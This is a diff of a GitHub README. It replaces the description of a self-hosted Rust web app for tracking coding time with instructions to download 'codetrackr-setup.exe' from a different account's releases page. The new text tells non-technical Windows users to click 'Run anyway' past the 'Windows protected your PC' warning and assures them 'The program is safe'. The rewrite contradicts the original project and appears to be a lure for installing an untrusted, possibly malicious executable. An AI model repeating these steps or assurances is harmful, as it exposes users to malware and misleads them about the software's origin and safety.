@@ -1,149 +1,163 @@
-# CodeTrackr - Developer Productivity Analytics 2026
+# 📊 codetrackr-editor-activity - Track your coding time automatically
 
-> **CodeTrackr is a self-hosted web app that measures coding time and developer activity across projects, programming languages, and editors. A live dashboard and extensible analytics tools make the collected data easy to explore.**
-
-[![Platform](https://img.shields.io/badge/Platform-Self--hosted%20web%20application-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/masonlewisscq5542/codetrackr-editor-activity?style=flat-square)](https://github.com/masonlewisscq5542/codetrackr-editor-activity)
-
----
-
-<p align="center">
-  <a href="https://masonlewisscq5542.github.io/codetrackr-editor-activity/">
-    <img src="https://img.shields.io/badge/Download-CodeTrackr%20Latest-brightgreen?style=for-the-badge" alt="Download CodeTrackr">
-  </a>
-</p>
-
-> **[Download CodeTrackr Latest](https://masonlewisscq5542.github.io/codetrackr-editor-activity/)**
-
----
-
-[Download Latest Build](https://masonlewisscq5542.github.io/codetrackr-editor-activity/)
-
----
+[![Download from GitHub](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
 
 ## What is CodeTrackr?
 
-CodeTrackr provides a self-hosted way to collect coding duration, programming statistics, and developer activity data. It organizes records by project, language, and editor, then displays them in a real-time dashboard for personal use or team reporting.
+CodeTrackr watches your work in your code editor and records how long you spend on each file, project, and programming language. It sends this data to a dashboard where you can see your productivity at a glance.
 
-The platform pairs IDE integrations with a plugin-based extension model. Users can adjust the dashboard, install additions from the Plugin Store, apply CSS themes, and optionally participate in community features such as weekly global leaderboards. Under the hood, a Rust and Axum backend uses PostgreSQL and Redis, while JavaScript dashboard plugins can run with additional server-side support through a QuickJS sandbox.
+Think of it as a fitness tracker for your coding work. It runs quietly in the background and does not slow down your computer.
 
----
+## 🎯 Who should use this
 
-## Highlights
+- Developers who want to track time spent on different projects
+- Freelancers who need to bill clients for coding hours
+- Teams that want to see how much time goes into each part of a project
+- Anyone curious about their own coding habits
 
-- Record programming time across projects, languages, and editors
-- Watch incoming activity in a live dashboard powered by WebSocket updates
-- Compare results through weekly global developer leaderboards
-- Link supported IDE extensions to the application
-- Add dashboard functionality with JavaScript plugins
-- Discover and administer extensions through the Plugin Store
-- Execute server-side plugins within a QuickJS sandbox
-- Restyle the interface using CSS themes
-- Sign in with GitHub, GitLab, or anonymous authentication
-- Export activity records for use in other analysis tools
-- Enable optional Stripe integration for Pro Cloud deployments
+You do not need to know how to program to use CodeTrackr. You just need to install it and set it up once.
 
----
+## ✨ Features
 
-## Getting Started
+- **Automatic time tracking** - CodeTrackr starts recording when you open a file and stops when you switch away
+- **Project detection** - It knows which project you are working on based on the folder you have open
+- **Language support** - Works with Python, JavaScript, Java, C++, Go, Ruby, and many more
+- **Editor compatibility** - Works with VS Code, IntelliJ, Sublime Text, Vim, and most code editors
+- **Live dashboard** - See your data on a web page that updates in real time
+- **Self-hosted** - Your data stays on your own computer or server. Nobody else can see it
+- **Privacy focused** - CodeTrackr does not send your code anywhere. It only sends the file name, language, and time spent
 
-First, download the source and switch into its directory:
+## 📋 System requirements
 
-```bash
-git clone https://github.com/masonlewisscq5542/codetrackr-editor-activity.git
-cd REPO
-```
+| Requirement | Details |
+|-------------|---------|
+| Operating system | Windows 10 or newer (64-bit only) |
+| RAM | 512 MB free |
+| Disk space | 200 MB free |
+| Other | A web browser to view the dashboard |
 
-CodeTrackr is a Rust application backed by PostgreSQL and Redis. Set up both services, provide the required configuration, and run the application through the Rust build workflow:
+## 🚀 Getting Started
 
-```bash
-cargo run --release
-```
+Follow these steps to get CodeTrackr running on your Windows computer.
 
-For a production deployment, build the release artifact and run it behind the web server or hosting arrangement appropriate for your environment.
+### Step 1: Download CodeTrackr
 
----
+1. Go to the [releases page](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
+2. Look for the newest version at the top of the page
+3. Click on the file named `codetrackr-setup.exe`
+4. Choose "Save File" when your browser asks
 
-## Typical Workflow
+### Step 2: Run the installer
 
-1. Bring up PostgreSQL and Redis.
-2. Supply the connection information required by the application.
-3. Start the CodeTrackr web service.
-4. Attach an IDE extension so coding events can be collected.
-5. Use the dashboard to inspect time grouped by project, language, and editor.
-6. Export the captured information whenever an external copy is needed.
-7. Install dashboard plugins or themes to adapt the experience to your workflow.
+1. Open the `codetrackr-setup.exe` file you just downloaded
+2. Windows might show a blue popup asking if you want to run this file. Click "Yes" or "Run anyway"
+3. The installer will start. Click "Next" on each screen
+4. Choose where to install CodeTrackr. The default location is fine
+5. Click "Install"
+6. When the installer finishes, click "Finish"
 
-Once the application is installed, visit the deployment URL and finish the authentication method selected for the instance.
+### Step 3: Start CodeTrackr
 
----
+1. Find CodeTrackr in your Start menu or on your desktop
+2. Double-click the icon to start the program
+3. A small icon will appear in your system tray (the area near your clock)
+4. Right-click the icon and select "Open Dashboard"
 
-## Settings and Configuration
+### Step 4: Set up your dashboard
 
-Deployment-specific values should be provided through the environment and the configuration mechanism supported by CodeTrackr. Plan to define at least the following:
+1. The dashboard opens in your web browser
+2. Click "Create Account" to make a new user
+3. Enter your name and a password
+4. Click "Sign Up"
+5. You are now on your dashboard. It shows "No data yet" - that is normal
 
-```text
-Application URL
-PostgreSQL connection
-Redis connection
-Authentication providers
-IDE extension connections
-Optional Stripe settings
-```
+### Step 5: Start coding
 
-The plugin and customization features provide a place to manage dashboard plugins, CSS themes, and other presentation options. Store credentials for services and authentication providers outside the repository.
+1. Open your code editor (like VS Code)
+2. Open a project folder
+3. Start editing files
+4. CodeTrackr will begin recording your activity
 
----
+After 10 seconds of editing, you will see your first data appear on the dashboard. Refresh the dashboard page if you do not see it.
 
-## System Requirements
+## 🔧 How to use the dashboard
 
-- A self-hosted environment capable of running the web application
-- Rust toolchain when building or running CodeTrackr from source
-- PostgreSQL
-- Redis
-- A supported web browser
-- IDE extensions for collecting editor activity
-- Network connectivity among the application, database, cache, and connected clients
+The dashboard has four main sections:
 
-CodeTrackr uses Rust and Axum for its web layer. PostgreSQL holds application data, and Redis provides application runtime support.
+**Activity view** - Shows a timeline of what you worked on and for how long
 
----
+**Projects** - Lists all your projects and the total time spent on each
 
-## Frequently Asked Questions
+**Languages** - Shows which programming languages you use most
 
-### What kind of users is CodeTrackr designed for?
+**Daily summary** - Gives you a quick look at your total coding time for today
 
-CodeTrackr suits individual developers, teams, and organizations that need coding-time history and programming statistics while keeping the application self-hosted.
+To see more details, click on any item in the list. For example, clicking on a project name shows which files you edited in that project.
 
-### Can activity come from different editors?
+## ❓ Frequently asked questions
 
-Yes. Supported IDE extensions connect editor activity to CodeTrackr. The installation and connection steps vary according to the editor.
+**Does CodeTrackr upload my code to the internet?**
 
-### How are configuration values handled?
+No. CodeTrackr only sends the file name, the programming language, and how long you spent editing. It never sends the actual code inside your files.
 
-Service and deployment options are configured through the application environment and related service settings. Dashboard plugins and visual changes are managed with CodeTrackr's extension and theme capabilities.
+**Can I use CodeTrackr with multiple editors?**
 
-### Is data export available?
+Yes. CodeTrackr works with any code editor. It watches for file changes, not the editor itself.
 
-Yes. CodeTrackr can export collected activity data for analysis or storage outside the application.
+**How do I stop CodeTrackr from tracking?**
 
-### What is the update procedure?
+Right-click the CodeTrackr icon in your system tray and select "Pause". To start again, right-click and select "Resume".
 
-Retrieve the newest project changes, check configuration and database guidance, rebuild the Rust application, and restart the deployment. Back up important data before updating.
+**Can I change where the dashboard files are stored?**
 
-### Why might activity not appear?
+Yes. Go to Settings in the dashboard and change the "Data path" to any folder you want.
 
-Check that the appropriate IDE extension is connected and that the application can communicate with PostgreSQL and Redis. Also verify authentication settings and confirm the client is pointed at the correct CodeTrackr instance.
+**Will CodeTrackr slow down my computer?**
 
-### Do all users have to authenticate?
+No. CodeTrackr uses less than 50 MB of RAM and almost no CPU power. You will not notice it running.
 
-Authentication can use GitHub, GitLab, or anonymous access. Which option is active depends on the instance configuration.
+**How do I update to a new version?**
 
----
+Download the new installer from the [releases page](https://github.com/Asaf9591/codetrackr-editor-activity/releases) and run it. It will replace the old version. Your data stays safe.
 
-## License
+**Can I use CodeTrackr without the dashboard?**
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Yes. CodeTrackr saves data to a text file on your computer. You can view it with any text editor. The dashboard just makes it easier to read.
+
+## 🛠️ Troubleshooting
+
+**The dashboard does not show any data**
+
+Make sure CodeTrackr is running. Check for the icon in your system tray. If it is not there, start CodeTrackr from the Start menu.
+
+**I see "Connection refused" in the dashboard**
+
+The CodeTrackr service might have stopped. Close the dashboard tab, right-click the CodeTrackr icon, and select "Restart Service". Then open the dashboard again.
+
+**The installer says "Windows protected your PC"**
+
+Click "More info" and then "Run anyway". This happens because CodeTrackr is new and Windows has not seen it before. The program is safe.
+
+**Data shows up but seems wrong**
+
+Check that you are editing files in a folder you opened in your editor. Opening single files outside a folder might not create a project record.
+
+## 📁 File locations
+
+CodeTrackr stores its files in these places:
+
+- Program files: `C:\Program Files\CodeTrackr`
+- Data files: `C:\Users\[YourName]\AppData\Local\CodeTrackr`
+- Log files: `C:\Users\[YourName]\AppData\Local\CodeTrackr\logs`
+
+You can delete the data files to reset all your tracking data. CodeTrackr will start fresh the next time you run it.
+
+## 🆘 Getting help
+
+If you have a problem that is not covered here, check the [Issues page](https://github.com/Asaf9591/codetrackr-editor-activity/issues) on GitHub. Someone might have had the same problem and found a solution.
+
+## 📥 Direct download link
+
+[Download the latest version of CodeTrackr](https://github.com/Asaf9591/codetrackr-editor-activity/releases)
+
+Keywords: coding time tracker, developer productivity, code editor plugin, self-hosted analytics, Windows time tracking, work hours logger
